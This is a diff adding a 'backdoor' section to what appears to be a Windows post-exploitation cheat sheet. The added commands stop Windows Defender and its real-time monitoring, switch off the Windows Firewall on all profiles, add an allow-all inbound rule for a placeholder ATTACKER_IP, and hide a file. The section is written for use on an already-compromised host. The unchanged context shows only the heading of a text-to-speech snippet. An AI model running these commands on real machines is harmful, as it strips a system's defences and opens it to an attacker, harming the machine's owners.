@@ -1,3 +1,24 @@
+# backdoor
+#### Disable Windows Defender
+```
+sc config WinDefend start= disabled
+sc stop WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+#### Disable Windows Firewall
+```
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+# ip whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
+#### hidden file 
+```
+attrib +h c:\autoexec.bat
+```
+
+# Use
 #### Speak
 ```
 Add-Type -AssemblyName System.speech
